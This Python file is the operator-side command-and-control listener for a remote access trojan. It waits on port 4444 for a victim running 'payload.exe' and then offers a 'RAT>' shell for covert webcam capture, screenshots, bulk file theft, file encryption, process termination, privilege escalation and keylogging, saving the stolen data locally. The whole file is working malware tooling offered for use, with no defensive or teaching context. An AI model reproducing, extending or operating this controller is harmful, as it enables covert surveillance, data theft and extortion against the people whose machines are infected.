import socket
import json
import base64
import os
from datetime import datetime

def save_file(content, filename):
    try:
        with open(filename, "wb") as f:
            f.write(base64.b64decode(content))
        return True
    except:
        return False

def start_listener():
    s = socket.socket()
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', 4444))
    s.listen(1)
    print(f"[*] Listening on 192.168.1.7:4444... (Run payload.exe on target)")
    
    while True:
        try:
            conn, addr = s.accept()
            print(f"[+] Connection from {addr[0]}")
            
            try:
                sysinfo = json.loads(conn.recv(999999).decode())
                print("\n=== SYSTEM INFO ===")
                print(json.dumps(sysinfo, indent=4))
            except:
                print("[!] Could not receive system info")
            
            while True:
                cmd = input("\nRAT> ")
                if not cmd:
                    continue
                    
                try:
                    conn.send(cmd.encode())
                    
                    if cmd.lower() == "exit":
                        conn.close()
                        break
                        
                    data = conn.recv(9999999).decode()
                    
                    if cmd == "webcam":
                        if save_file(data, f"webcam_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg"):
                            print("[+] Webcam saved")
                        else:
                            print("[!] Failed to save webcam")
                    elif cmd == "screenshot":
                        if save_file(data, f"screen_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png"):
                            print("[+] Screenshot saved")
                        else:
                            print("[!] Failed to save screenshot")
                    elif cmd == "sysinfo":
                        try:
                            print(json.dumps(json.loads(data), indent=4))
                        except:
                            print(data)
                    elif cmd == "autodownload":
                        try:
                            files = json.loads(data)
                            print(f"[+] Downloaded {len(files)} files:")
                            for file in files:
                                if save_file(file["content"], file["name"]):
                                    print(f" - {file['name']} ({file['size']} bytes)")
                                else:
                                    print(f" - Failed to save {file['name']}")
                        except:
                            print("[!] Invalid file data received")
                    elif cmd.startswith("file_list"):
                        try:
                            print("Files:", ", ".join(json.loads(data)))
                        except:
                            print(data)
                    elif cmd.startswith("file_read"):
                        filename = input("Save as: ") or "downloaded_file"
                        if save_file(data, filename):
                            print(f"[+] Saved as {filename}")
                        else:
                            print("[!] Failed to save file")
                    elif cmd.startswith("encrypt"):
                        print(data)
                    elif cmd.startswith("terminate"):
                        print(data)
                    elif cmd == "escalate":
                        print(data)
                    elif cmd == "keylogger start":
                        print(data)
                    elif cmd == "keylogger stop":
                        print(data)
                    elif cmd == "help":
                        print(data)
                    else:
                        print(data)
                except Exception as e:
                    print(f"[!] Error: {str(e)}")
                    break
        except KeyboardInterrupt:
            print("\n[*] Shutting down...")
            break
        except Exception as e:
            print(f"[!] Listener error: {str(e)}")
            continue

if __name__ == "__main__":
    start_listener()
